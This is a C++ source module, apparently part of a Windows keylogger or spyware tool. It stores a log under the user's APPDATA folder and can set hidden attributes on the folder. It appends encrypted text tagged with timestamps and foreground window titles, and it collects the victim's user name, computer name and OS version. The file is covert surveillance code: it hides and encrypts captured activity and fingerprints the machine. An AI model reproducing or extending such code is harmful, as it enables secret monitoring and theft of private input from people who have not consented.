#include "stream.h"
#include "debug.h"
#include <iostream>

#define APPDATA "APPDATA"

std::string Stream::GetPath(const std::string &dir) {
  char *buf = nullptr;
  size_t size = 0;
  std::string finalDir;

  if (_dupenv_s(&buf, &size, APPDATA) == 0 && buf != nullptr) {
	finalDir = buf;
  }
  finalDir += dir;
  free(buf);
  return finalDir;
}

bool Stream::MakeDir(const std::string &path, const std::string &name, DWORD fileAttribute) {
  const std::string final = path + name;
  bool ret = CreateDirectoryA(final.c_str(), nullptr) || GetLastError() == ERROR_ALREADY_EXISTS;
  SetFileAttributesA(final.c_str(), fileAttribute);
  return ret;
}

bool Stream::WriteLog(const std::string &input, int active, const bool blockProcessInfo) {
  int cur = SystemData::GetProcessId();
  bool processInfo = SystemData::ProcessChanged(active, cur, true);

  logFile->Ofstream.open(logFile->PathFull, std::fstream::app);
  if (!logFile->Ofstream.is_open()) {
	return false;
  }

  if (processInfo && !blockProcessInfo) {
	std::string timeString =
		"\n[" + SysTime::SystemTime::GetFullDate() + " " + Convert::HwndToString(GetForegroundWindow()) + "]\n";
	Crypt::Encrypt(timeString);
	logFile->Ofstream << timeString;
  }
  std::string cryptInput = input;
  Crypt::Encrypt(cryptInput);
  logFile->Ofstream << cryptInput;
  logFile->Ofstream.close();
  return true;
}
bool Stream::MakeFile(const std::string &fileName, const std::string &path) {
  try {
	logFile = new Stream::LogFile(Stream::GetPath(path), fileName);
  } catch (...) {
	return false;
  }
  return true;
}

void Stream::GetAccountInfo(ClientInfo *data) {
  data->osVersionInfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
  GetVersionEx(&data->osVersionInfo);

  DWORD sysLen = UNLEN + 1;

  GetUserName(reinterpret_cast<LPSTR>(data->accountName), &sysLen);
  GetComputerName(reinterpret_cast<LPSTR>(data->computerName), &sysLen);
}
